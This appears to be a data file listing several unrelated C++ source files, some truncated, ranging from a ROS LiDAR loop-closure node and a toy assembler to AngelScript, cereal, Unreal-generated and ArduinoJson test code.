    "#include <IntensityTD.hpp>\n#include <iostream>\n#include <fstream>\n#include <gtsam/geometry/Pose3.h>\n#include <gtsam/nonlinear/ISAM2.h>\n#include <gtsam/nonlinear/Values.h>\n#include <gtsam/slam/BetweenFactor.h>\n#include <gtsam/slam/PriorFactor.h>\n\nstd::string lidar_topic, odom_topic;\nint width, height;\nint kf_frame_gap;\nint lc_mode = 0; // 0:itdicp 1:icp 2:itd\nfloat run_freq;  // The frequency of program execution\nshared_ptr<IntensityTD> intensity_td;\nshared_ptr<ITDVis> itd_vis;\nshared_ptr<ITDLog> itd_log;\n\n// Factor graph optimization, saving the pose and timestamp of each frame\ngtsam::Values initial;\ngtsam::NonlinearFactorGraph graph;\nvector<Eigen::Affine3d> pose_vec;\nvector<Eigen::Affine3d> pose_vec_aftopt;\nvector<double> pose_timestamp;\n\n// Capture keyboard termination signal\nbool flg_exit = false;\nvoid KillHandle(int sig)\n{\n    flg_exit = true;\n    ROS_WARN(\"catch sig %d\", sig);\n}\n\nros::Subscriber sub_pcl;\nros::Subscriber sub_imu;\nstd::mutex lidar_mtx;\nstd::mutex odom_mtx;\nstd::queue<sensor_msgs::PointCloud2::ConstPtr> lidar_buffer;\nstd::queue<nav_msgs::Odometry::ConstPtr> odom_buffer;\n\nvoid pcl_cbk(const sensor_msgs::PointCloud2::ConstPtr &msg)\n{\n    std::unique_lock<std::mutex> lock(lidar_mtx);\n\n    lidar_buffer.push(msg);\n}\n\nvoid odom_cbk(const nav_msgs::Odometry::ConstPtr &msg)\n{\n    std::unique_lock<std::mutex> lock(odom_mtx);\n\n    odom_buffer.push(msg);\n}\n\nbool sync_packages(PointCloudOuster::Ptr &cloud, Eigen::Affine3d &pose, double &timestamp)\n{\n    if (lidar_buffer.empty() || odom_buffer.empty())\n        return false;\n\n    auto laser_msg = lidar_buffer.front();\n    double laser_timestamp = laser_msg->header.stamp.toSec();\n\n    auto odom_msg = odom_buffer.front();\n    double odom_timestamp = odom_msg->header.stamp.toSec();\n\n    // check if timestamps are matched\n    if (abs(odom_timestamp - laser_timestamp) < 1e-3)\n    {\n        pcl::fromROSMsg(*laser_msg, *cloud);\n\n        Eigen::Quaterniond r(\n            odom_msg->pose.pose.orientation.w, odom_msg->pose.pose.orientation.x,\n            odom_msg->pose.pose.orientation.y, odom_msg->pose.pose.orientation.z);\n        Eigen::Vector3d t(odom_msg->pose.pose.position.x,\n                          odom_msg->pose.pose.position.y,\n                          odom_msg->pose.pose.position.z);\n\n        pose = Eigen::Affine3d::Identity();\n        pose.translate(t);\n        pose.rotate(r);\n\n        std::unique_lock<std::mutex> l_lock(lidar_mtx);\n        std::unique_lock<std::mutex> o_lock(odom_mtx);\n\n        lidar_buffer.pop();\n        odom_buffer.pop();\n    }\n    else if (odom_timestamp < laser_timestamp)\n    {\n        ROS_WARN(\"Current odometry is earlier than laser scan, discard one \"\n                 \"odometry data.\");\n        std::unique_lock<std::mutex> o_lock(odom_mtx);\n        odom_buffer.pop();\n        return false;\n    }\n    else\n    {\n        ROS_WARN(\n            \"Current laser scan is earlier than odometry, discard one laser scan.\");\n        std::unique_lock<std::mutex> l_lock(lidar_mtx);\n        lidar_buffer.pop();\n        return false;\n    }\n    timestamp = laser_timestamp;\n    return true;\n}\n\nvoid trans2LidarFrame(const PointCloudOuster::Ptr &ptr_ouster, PointCloudXYZI::Ptr &ptr, cv::Mat &inten_img)\n{\n    // Rearrange point clouds in image order\n    ptr->resize(height * width);\n    inten_img = cv::Mat(height, width, cv_pixel_type, cv::Scalar(0));\n\n    int pixel_shift_by_row[4] = {24, 16, 8, 0}; // 1024\n    // int pixel_shift_by_row[4] = {48, 32, 16, 0};  // 2048\n\n    for (size_t v = 0; v < height; v++)\n        for (size_t u = 0; u < width; u++)\n        {\n            const int uu = (u + width - pixel_shift_by_row[v % 4]) % width;\n            const int ori_idx = v * width + uu;\n            const int idx = v * width + u;\n            const auto &pt = ptr_ouster->points[ori_idx];\n            ptr->points[idx].x = pt.x;\n            ptr->points[idx].y = pt.y;\n            ptr->points[idx].z = pt.z;\n            ptr->points[idx].intensity = pt.reflectivity;\n            inten_img.at<pixel_type>(v, u) = pt.reflectivity;\n        }\n}\n\nvoid update_poses(const gtsam::Values &estimates,\n                  std::vector<Eigen::Affine3d> &poses)\n{\n    assert(estimates.size() == poses.size());\n\n    poses.clear();\n\n    for (int i = 0; i < estimates.size(); ++i)\n    {\n        auto est = estimates.at<gtsam::Pose3>(i);\n        Eigen::Affine3d est_affine3d(est.matrix());\n        poses.push_back(est_affine3d);\n    }\n}\n\nint main(int argc, char **argv)\n{\n    Eigen::initParallel();\n    ros::init(argc, argv, \"demo_online_opt\");\n    // Avoid PCL Warnings\n    pcl::console::setVerbosityLevel(pcl::console::L_ERROR);\n    ros::NodeHandle nh;\n\n    intensity_td = std::make_shared<IntensityTD>(nh);\n    itd_vis = std::make_shared<ITDVis>(nh);\n    itd_log = std::make_shared<ITDLog>(nh);\n\n    nh.param<float>(\"run_freq\", run_freq, 10.0);\n    nh.param<std::string>(\"lidar_topic\", lidar_topic, \"/os_cloud_node/points\");\n    nh.param<std::string>(\"odom_topic\", odom_topic, \"/Odometry\");\n    nh.param",
    "/** \n *   AUTORES : Caio Barbieri & Ana Julia Molinos\n *   DATA    : 9/08/2024\n *   Arquivo que implementa os testes definidos em \"testes.hpp\".\n * \n *  Para descricaoes das funcoes e detalhes de autoria vide \"testes.hpp\".\n*/\n#include <SFML/Graphics.hpp>\n#include <iostream>\n#include <time.h>\n#include \"../Listas/Lista.hpp\"\n#include \"testes.hpp\"\n#include \"Coordenada.hpp\"\n#include \"Gerenciadores/GerenciadorColisoes.hpp\"\n\n#include \"Gerenciadores/GerenciadorGrafico.hpp\"\n#include \"Gerenciadores/GerenciadorEventos.hpp\"\n\n#include \"ElementosGraficos/Forma.hpp\"\n\n#include \"Entidades/Entidade.hpp\"\n#include \"Entidades/Personagens/Jogador.hpp\"\n#include \"Ente.hpp\"\n#include \"Entidades/Obstaculos/Plataforma.hpp\"\n#include \"Entidades/Obstaculos/Lapis.hpp\"\n\n#include \"Entidades/Personagens/Inimigos/Quadrado.hpp\"\n\nusing namespace std;\nusing namespace Listas;\nusing namespace ElementosGraficos;\n\n//Obs.: arrumar caminho da textura desejada  (p/ mim s\u00f3 funcinou assim, preciso arrumar)\n#define CAMINHO_TEXTURA \"../img/emoji_com_faca.png\"\n\nvoid esperaEnter()\n{\n    cout <<                                         endl;\n    cout << \"----------------------------------\" << endl;\n    cout << \" Pressione ENTER para prosseguir. \" << endl;\n    cout << \"----------------------------------\" << endl;\n    cout <<                                         endl;\n\n    cin.get();\n}\n\nvoid testeJanela()\n{\n    sf::RenderWindow window(sf::VideoMode(200, 200), \"SFML works!\");\n    sf::CircleShape shape(100.f);\n    shape.setFillColor(sf::Color::Green);\n\n    while (window.isOpen())\n    {\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear();\n        window.draw(shape);\n        window.display();\n    }\n}\n\nvoid testeElemento()\n{\n    Lista<int>::Elemento e1(NULL);\n    Lista<int>::Elemento e2(NULL);\n\n    e1.setInfo(new int(123));\n    e2.setInfo(new int(321));\n    e1.setProx(&e2);\n\n    cout << \"Numero do elemento 1: \" << *(e1.getInfo()) << \".\" << endl;\n    cout << \"Numero do elemento 2: \" << *(e2.getInfo()) << \".\" << endl;\n\n    cout << \"Elemento 1 aponta para: \" << *(e1.getProx()->getInfo()) << \".\" << endl;\n\n    cout << endl << \"TROCANDO ELEMENTOS...\" << endl;\n    \n    e1.trocaAdiante();\n\n    cout << \"Numero do elemento 1: \" << *(e1.getInfo()) << \".\" << endl;\n    cout << \"Numero do elemento 2: \" << *(e2.getInfo()) << \".\" << endl;\n\n    cout << \"Elemento 1 aponta para: \" << *(e1.getProx()->getInfo()) << \".\" << endl;\n\n    esperaEnter();\n}\n\nvoid testeLista()\n{\n    srand(time(0));\n\n    cout << endl;\n    cout << \"Crie uma lista.    \";\n    Lista<int> umaLista;\n    cout << \"R: Criei.\" << endl << endl;\n    \n    cout << \"A lista estah vazia?    R: \" << (umaLista.vazia() ? \"Sim.\" : \"Nao.\") << endl; \n    cout << \"Adicione 4 , 2 com push_front e 2 com push_back.    \";\n\n    umaLista.push_front (new int(rand()%100));  // Adiciona na frente...\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n    umaLista.push_front (new int(rand()%100));\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n\n    umaLista.push_back  (new int(rand()%100));  // ...adiciona no fim\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n    umaLista.push_back  (new int(rand()%100));\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n    cout << \"R: Veja os numeros:    \";\n    umaLista.imprimir();\n\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n    cout << \"A lista estah vazia?    R: \" << (umaLista.vazia() ? \"Sim.\" : \"Nao.\") << endl << endl;\n\n    cout << \"Coloque o numero 100 nas posicoes 0 (inicio), 3 (meio) e 6 (final) (push_n).    \";\n    umaLista.push_n (new int(100), 0); // Adiciona em uma posicao especifica.\n    umaLista.push_n (new int(100), 3);\n    umaLista.push_n (new int(100), 6);\n\n    cout << \"R: Coloquei! Veja a lista:\" << endl;\n    umaLista.imprimir();\n\n    cout << \"\\nPRIMEIRO: \" << *(umaLista.getPrimeiro()->getInfo()) << \".\\nULTIMO: \" << *(umaLista.getUltimo()->getInfo()) << \"\\n\" << endl;\n\n    cout << \"Remova da lista elemento por elemento.    R: OK! ...\" << endl;\n    umaLista.removeElemento(umaLista.getPrimeiro());\n    umaLista.imprimir();\n    umaLista.removeElemento(umaLista.getUltimo());\n    umaLista.imprimir();        \n     umaLista.removeElemento(umaLista.getPrimeiro()->getProx());\n     umaLista.imprimir();\n    umaLista.pop_front();\n    umaLista.imprimir();\n     umaLista.pop_front();\n     umaLista.imprimir();        \n    umaLista.pop_front();\n    umaLista.imprimir();        \n     umaLista.removeElemento(umaLista.getPrimeiro",
    "//Do not distribute\n//Copyright Ben Hall 2024\n\n#define eaa 000001\n#define esa 000010\n#define ema 000011\n#define eda 000100\n#define jmp 000101\n#define cme 000110\n#define cmg 000111\n#define cge 001000\n#define anb 001001\n#define axb 001010\n#define rtb 001011\n#define btr 001100\n#define bta 001101\n#define atb 001110\n#define btm 001111\n#define mtb 010000\n#define bts 010001\n#define stb 010010\n#define qtb 010011\n#define btq 010100\n#define btl 010101\n#define ltb 010110\n#define bte 010111\n#define etb 011000\n#define dtb 011001\n#define nop 011010\n#define qib 011011\n#define lib 011100\n#define irf 011101\n#define ibf 011110\n#define imf 011111\n#define iaf 100000\n#define ijf 100001\n#define isf 100010\n#define iqf 100011\n#define iof 100100\n#define iff 100101\n#define hlt 100110\n#define caa 100111\n#define cab 101000\n\n#include <iostream>\n#include <string>\n#include <fstream>\nusing namespace std;\n\nint prompt() {\n\tstring input;\n\tstring sourcefile;\n\tstring compilefile;\n\tstring filecontent;\n\tcout << \">\";\n\tcin >> input;\n\tif (input == \"h\") {\n\t\tcout << \"First type a mode, right now there is only bin so type that\";\n\t\tcout << \"Type the name of the source file path\\n\";\n\t\tcout << \"Then type the name of the new file that will be compiled\";\n\t}\n\tif (input == \"bin\") {\n\t\tcout << \"Source: \";\n\t\tcin >> sourcefile;\n\t\tcout << \"Compiled: \";\n\t\tcin >> compilefile;\n\t\tofstream MyWriteFile(compilefile);\n\t\tifstream MyReadFile(sourcefile);\n\t\twhile (getline (MyReadFile, filecontent)) {\n\t\t\tif (filecontent == \"eaa\") {\n\t\t\t\tMyWriteFile << \"000001\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"esa\") {\n\t\t\t\tMyWriteFile << \"000010\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"ema\") {\n\t\t\t\tMyWriteFile << \"000011\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"eda\") {\n\t\t\t\tMyWriteFile << \"000100\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"jmp\") {\n\t\t\t\tMyWriteFile << \"000101\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"cme\") {\n\t\t\t\tMyWriteFile << \"000110\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"cmg\") {\n\t\t\t\tMyWriteFile << \"000111\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"cge\") {\n\t\t\t\tMyWriteFile << \"001000\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"anb\") {\n\t\t\t\tMyWriteFile << \"001001\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"axb\") {\n\t\t\t\tMyWriteFile << \"001010\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"rtb\") {\n\t\t\t\tMyWriteFile << \"001011\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"btr\") {\n\t\t\t\tMyWriteFile << \"001100\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"bta\") {\n\t\t\t\tMyWriteFile << \"001101\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"atb\") {\n\t\t\t\tMyWriteFile << \"001110\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"btm\") {\n\t\t\t\tMyWriteFile << \"001111\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"mtb\") {\n\t\t\t\tMyWriteFile << \"010000\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"bts\") {\n\t\t\t\tMyWriteFile << \"010001\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"stb\") {\n\t\t\t\tMyWriteFile << \"010010\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"qtb\") {\n\t\t\t\tMyWriteFile << \"010011\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"btq\") {\n\t\t\t\tMyWriteFile << \"010100\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"btl\") {\n\t\t\t\tMyWriteFile << \"010101\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"ltb\") {\n\t\t\t\tMyWriteFile << \"010110\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"bte\") {\n\t\t\t\tMyWriteFile << \"010111\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"etb\") {\n\t\t\t\tMyWriteFile << \"011000\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"dtb\") {\n\t\t\t\tMyWriteFile << \"011001\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"nop\") {\n\t\t\t\tMyWriteFile << \"000000\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"qib\") {\n\t\t\t\tMyWriteFile << \"011011\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"lib\") {\n\t\t\t\tMyWriteFile << \"011100\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"irf\") {\n\t\t\t\tMyWriteFile << \"011101\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"ibf\") {\n\t\t\t\tMyWriteFile << \"011110\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"imf\") {\n\t\t\t\tMyWriteFile << \"011111\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"iaf\") {\n\t\t\t\tMyWriteFile << \"100000\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"ijf\") {\n\t\t\t\tMyWriteFile << \"100001\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"isf\") {\n\t\t\t\tMyWriteFile << \"100010\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"iqf\") {\n\t\t\t\tMyWriteFile << \"100011\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"iof\") {\n\t\t\t\tMyWriteFile << \"100100\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"iff\") {\n\t\t\t\tMyWriteFile << \"100101\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"hlt\") {\n\t\t\t\tMyWriteFile << \"100110\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"caa\") {\n\t\t\t\tMyWriteFile << \"100111\\n\";\n\t\t\t}\n\t\t\tif (filecontent == \"cab\") {\n\t\t\t\tMyWriteFile << \"101000\\n\";\n\t\t\t}\n\t\t}\n\t\tMyReadFile.close();\n\t}\n}\nint main() {\n\tprompt();\n\treturn 0;\n}\n",
    "#include \"context.h\"\n#include \"shader.h\"\n\n#include \"texture.h\"\n\n#include \"clock.h\"\n\n\n#include \"camera.h\"\n#include \"player.h\"\n//#include \"inputs.h\"\n\n\n//\n#include <bx/timer.h>\n#include <bx/math.h>\n#include \"entry/entry.h\"\n#include \"entry/cmd.h\"\n#include \"entry/input.h\"\n#include <bx/allocator.h>\n//\n\n\n\nint _main_(int _argc, char** _argv)\n{\n\tContext& context = Context::Instance();\n\tcontext.init(_argc, _argv, 1280, 720);\n\tModel m;\n\tm.addFace(LEFT_FACE, { 0,0,0 }, { 0,0,0 });\n\tm.addFace(RIGHT_FACE, { 0,0,0 }, { 0,0,0 });\n\tm.addFace(TOP_FACE, { 0,0,0 }, { 0,0,0 });\n\tm.addFace(BOTTOM_FACE, { 0,0,0 }, { 0,0,0 });\n\tm.addFace(FRONT_FACE, { 0,0,0 }, { 0,0,0 });\n\tm.addFace(BACK_FACE, { 0,0,0 }, { 0,0,0 });\n\n\tm.buffer(&m);\n\n\t// model if ^^ before shader, works. hm, well bolls.\n\n\tShader shader(\"a\", \"b\");\n\n\t//Inputs& input = Inputs::Instance();\n\n\tTexture tex(\"res/textures/grass.png\");\n\n\tPlayer p;\n\n\n\twhile (context.isRunning)\n\t{\n\t\tstatic Clock clock;\n\t\tfloat dt = clock.restart();\n\n\t\t//inputSetMouseLock(true); // ?que te gusta?\n\n\t\tcontext.update();\n\t\t\n\t\tp.update(dt, context.m_mouseState, context.m_state);\n\n\t\tconst Camera& cam = p.getCamera();\n\n\t\tshader.loadMatrix(cam);\n\t\tshader.loadModelMatrix({ 0,0,-5 });\n\n\n\t\ttex.bind();\n\t\tm.bind();\n\n\t\tshader.use();\n\n\n\t\tcontext.draw();\n\t}\n\n\t//context.shutdown();\n\n\treturn 0;\n}\n ",
    "/*\r\n   AngelCode Scripting Library\r\n   Copyright (c) 2003-2021 Andreas Jonsson\r\n\r\n   This software is provided 'as-is', without any express or implied\r\n   warranty. In no event will the authors be held liable for any\r\n   damages arising from the use of this software.\r\n\r\n   Permission is granted to anyone to use this software for any\r\n   purpose, including commercial applications, and to alter it and\r\n   redistribute it freely, subject to the following restrictions:\r\n\r\n   1. The origin of this software must not be misrepresented; you\r\n      must not claim that you wrote the original software. If you use\r\n      this software in a product, an acknowledgment in the product\r\n      documentation would be appreciated but is not required.\r\n\r\n   2. Altered source versions must be plainly marked as such, and\r\n      must not be misrepresented as being the original software.\r\n\r\n   3. This notice may not be removed or altered from any source\r\n      distribution.\r\n\r\n   The original version of this library can be located at:\r\n   http://www.angelcode.com/angelscript/\r\n\r\n   Andreas Jonsson\r\n   andreas@angelcode.com\r\n*/\r\n\r\n// A class that holds a script module\r\n\r\n#include \"as_config.h\"\r\n#include \"as_module.h\"\r\n#include \"as_builder.h\"\r\n#include \"as_context.h\"\r\n#include \"as_texts.h\"\r\n#include \"as_debug.h\"\r\n/// #include \"as_restore.h\"\r\n\r\nBEGIN_AS_NAMESPACE\r\n\r\n// internal\r\nasCModule::asCModule(const char *name, asCScriptEngine *engine)\r\n{\r\n    m_name   = name;\r\n    m_engine = engine;\r\n\r\n\tm_userData = 0;\r\n\tm_builder = 0;\r\n\tm_isGlobalVarInitialized = false;\r\n\r\n\tm_accessMask = 1;\r\n\r\n\tm_defaultNamespace = engine->nameSpaces[0];\r\n}\r\n\r\n// internal\r\nasCModule::~asCModule()\r\n{\r\n\tInternalReset();\r\n\r\n\t// The builder is not removed by InternalReset because it holds the script\r\n\t// sections that will be built, so we need to explictly remove it now if it exists\r\n\tif( m_builder )\r\n\t{\r\n\t\tasDELETE(m_builder,asCBuilder);\r\n\t\tm_builder = 0;\r\n\t}\r\n\r\n\tif( m_engine )\r\n\t{\r\n\t\t// Clean the user data\r\n\t\tfor( asUINT n = 0; n < m_userData.GetLength(); n += 2 )\r\n\t\t{\r\n\t\t\tif( m_userData[n+1] )\r\n\t\t\t{\r\n\t\t\t\tfor( asUINT c = 0; c < m_engine->cleanModuleFuncs.GetLength(); c++ )\r\n\t\t\t\t\tif( m_engine->cleanModuleFuncs[c].type == m_userData[n] )\r\n\t\t\t\t\t\tm_engine->cleanModuleFuncs[c].cleanFunc(this);\r\n\t\t\t}\r\n\t\t}\r\n\t\t// Remove the module from the engine\r\n\t\t// The module must have been discarded before it is deleted\r\n\t\tasASSERT( !m_engine->scriptModules.Exists(this) );\r\n\t\tm_engine->discardedModules.RemoveValue(this);\r\n\t}\r\n}\r\n\r\n// interface\r\nvoid asCModule::Discard()\r\n{\r\n\t// Reset the global variables already so that no object in the global variables keep the module alive forever.\r\n\t// If any live object tries to access the global variables during clean up they will fail with a script exception,\r\n\t// so the application must keep that in mind before discarding a module.\r\n\tCallExit();\r\n\r\n\t// Keep a local copy of the engine pointer, because once the module is moved do the discarded\r\n\t// pile, it is possible that another thread might discard it while we are still in here. So no\r\n\t// further access to members may be done after that\r\n\tasCScriptEngine *engine = m_engine;\r\n\r\n\t// Instead of deleting the module immediately, move it to the discarded pile\r\n\t// This will turn it invisible to the application, yet keep it alive until all\r\n\t// external references to its entities have been released.\r\n    if( engine->lastModule == this ) engine->lastModule = 0;\r\n\tengine->scriptModules.RemoveValue(this);\r\n\tengine->discardedModules.PushLast(this);\r\n\r\n\t// Allow the engine to go over the list of discarded modules to see what can be cleaned up at this moment.\r\n\t// Don't do this if the engine is already shutting down, as it will be done explicitly by the engine itself with error reporting\r\n\tif( !engine->shuttingDown )\r\n\t{\r\n        if( engine->ep.autoGarbageCollect ) engine->GarbageCollect(); // GarbageCollect calls DeleteDiscardedModules\r\n        else                                engine->DeleteDiscardedModules();\r\n\t}\r\n}\r\n\r\n// interface\r\nvoid *asCModule::SetUserData( void *data, asPWORD type)\r\n{\r\n\t// It is not intended to store a lot of different types of userdata,\r\n\t// so a more complex structure like a associative map would just have\r\n\t// more overhead than a simple array.\r\n\tfor( asUINT n = 0; n < m_userData.GetLength(); n += 2 )\r\n\t{\r\n\t\tif( m_userData[n] == type )\r\n\t\t{\r\n\t\t\tvoid *oldData = reinterpret_cast<void*>(m_userData[n+1]);\r\n\t\t\tm_userData[n+1] = reinterpret_cast<asPWORD>(data);\r\n\t\t\treturn oldData;\r\n\t\t}\r\n\t}\r\n    m_userData.PushLast( type );\r\n    m_userData.PushLast( reinterpret_cast<asPWORD>(data) );\r\n\treturn 0;\r\n}\r\n\r\n// interface\r\nvoid *asCModule::GetUserData( asPWORD type ) const\r\n{\r\n\tfor( asUINT n = 0; n < m_userData.GetLength(); n += 2 )\r\n\t{\r\n\t\tif( m_userData[n] == type )\r\n\t\t{\r\n\t\t\tvoid *ud = reinterpret_cast<void*>(m_userData[n+1]);\r\n\t\t\treturn ud;\r\n\t\t}\r\n    }\r\n\treturn 0;\r\n}\r\n\r\n// interface\r\nasIScriptEngine *asCModule::GetEngine() const\r\n{\r\n\treturn m_engine;\r\n}\r\n\r\n// interface\r\nvoid asCModu",
    "/*\n  Copyright (c) 2017, Juan Pedro Bolivar Puente\n  All rights reserved.\n\n  Redistribution and use in source and binary forms, with or without\n  modification, are permitted provided that the following conditions are met:\n      * Redistributions of source code must retain the above copyright\n        notice, this list of conditions and the following disclaimer.\n      * Redistributions in binary form must reproduce the above copyright\n        notice, this list of conditions and the following disclaimer in the\n        documentation and/or other materials provided with the distribution.\n      * Neither the name of cereal nor the\n        names of its contributors may be used to endorse or promote products\n        derived from this software without specific prior written permission.\n\n  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n  ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n  DISCLAIMED. IN NO EVENT SHALL RANDOLPH VOORHIES AND SHANE GRANT BE LIABLE FOR ANY\n  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n  ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN\n#include \"optional.hpp\"\n\n#ifdef CEREAL_HAS_CPP17\n\nTEST_SUITE_BEGIN(\"std_optional\");\n\nTEST_CASE(\"binary_std_optional\")\n{\n  test_std_optional<cereal::BinaryInputArchive, cereal::BinaryOutputArchive>();\n}\n\nTEST_CASE(\"portable_binary_std_optional\")\n{\n  test_std_optional<cereal::PortableBinaryInputArchive, cereal::PortableBinaryOutputArchive>();\n}\n\nTEST_CASE(\"xml_std_optional\")\n{\n  test_std_optional<cereal::XMLInputArchive, cereal::XMLOutputArchive>();\n}\n\nTEST_CASE(\"json_std_optional\")\n{\n  test_std_optional<cereal::JSONInputArchive, cereal::JSONOutputArchive>();\n}\n\nTEST_SUITE_END();\n\n#endif // CEREAL_HAS_CPP17\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\r\n/*===========================================================================\r\n\tGenerated code exported from UnrealHeaderTool.\r\n\tDO NOT modify this manually! Edit the corresponding .h files instead!\r\n===========================================================================*/\r\n\r\n#include \"UObject/GeneratedCppIncludes.h\"\r\nPRAGMA_DISABLE_DEPRECATION_WARNINGS\r\nvoid EmptyLinkFunctionForGeneratedCodeFOF_Framework_init() {}\r\n\tstatic FPackageRegistrationInfo Z_Registration_Info_UPackage__Script_FOF_Framework;\r\n\tFORCENOINLINE UPackage* Z_Construct_UPackage__Script_FOF_Framework()\r\n\t{\r\n\t\tif (!Z_Registration_Info_UPackage__Script_FOF_Framework.OuterSingleton)\r\n\t\t{\r\n\t\t\tstatic const UECodeGen_Private::FPackageParams PackageParams = {\r\n\t\t\t\t\"/Script/FOF_Framework\",\r\n\t\t\t\tnullptr,\r\n\t\t\t\t0,\r\n\t\t\t\tPKG_CompiledIn | 0x00000000,\r\n\t\t\t\t0x7896D128,\r\n\t\t\t\t0x18C0041E,\r\n\t\t\t\tMETADATA_PARAMS(0, nullptr)\r\n\t\t\t};\r\n\t\t\tUECodeGen_Private::ConstructUPackage(Z_Registration_Info_UPackage__Script_FOF_Framework.OuterSingleton, PackageParams);\r\n\t\t}\r\n\t\treturn Z_Registration_Info_UPackage__Script_FOF_Framework.OuterSingleton;\r\n\t}\r\n\tstatic FRegisterCompiledInInfo Z_CompiledInDeferPackage_UPackage__Script_FOF_Framework(Z_Construct_UPackage__Script_FOF_Framework, TEXT(\"/Script/FOF_Framework\"), Z_Registration_Info_UPackage__Script_FOF_Framework, CONSTRUCT_RELOAD_VERSION_INFO(FPackageReloadVersionInfo, 0x7896D128, 0x18C0041E));\r\nPRAGMA_ENABLE_DEPRECATION_WARNINGS\r\n",
    "// ArduinoJson - https://arduinojson.org\n// Copyright \u00a9 2014-2024, Benoit BLANCHON\n// MIT License\n\n#include <ArduinoJson.h>\n#include <catch.hpp>\n\n#include \"Literals.hpp\"\n\ntypedef ArduinoJson::detail::ElementProxy<JsonDocument&> ElementProxy;\n\nTEST_CASE(\"ElementProxy::add()\") {\n  JsonDocument doc;\n  doc.add<JsonVariant>();\n  ElementProxy ep = doc[0];\n\n  SECTION(\"add(int)\") {\n    ep.add(42);\n\n    REQUIRE(doc.as<std::string>() == \"[[42]]\");\n  }\n\n  SECTION(\"add(const char*)\") {\n    ep.add(\"world\");\n\n    REQUIRE(doc.as<std::string>() == \"[[\\\"world\\\"]]\");\n  }\n\n  SECTION(\"set(char[])\") {\n    char s[] = \"world\";\n    ep.add(s);\n    strcpy(s, \"!!!!!\");\n\n    REQUIRE(doc.as<std::string>() == \"[[\\\"world\\\"]]\");\n  }\n}\n\nTEST_CASE(\"ElementProxy::clear()\") {\n  JsonDocument doc;\n  doc.add<JsonVariant>();\n  ElementProxy ep = doc[0];\n\n  SECTION(\"size goes back to zero\") {\n    ep.add(42);\n    ep.clear();\n\n    REQUIRE(ep.size() == 0);\n  }\n\n  SECTION(\"isNull() return true\") {\n    ep.add(\"hello\");\n    ep.clear();\n\n    REQUIRE(ep.isNull() == true);\n  }\n}\n\nTEST_CASE(\"ElementProxy::operator==()\") {\n  JsonDocument doc;\n\n  SECTION(\"1 vs 1\") {\n    doc.add(1);\n    doc.add(1);\n\n    REQUIRE(doc[0] <= doc[1]);\n    REQUIRE(doc[0] == doc[1]);\n    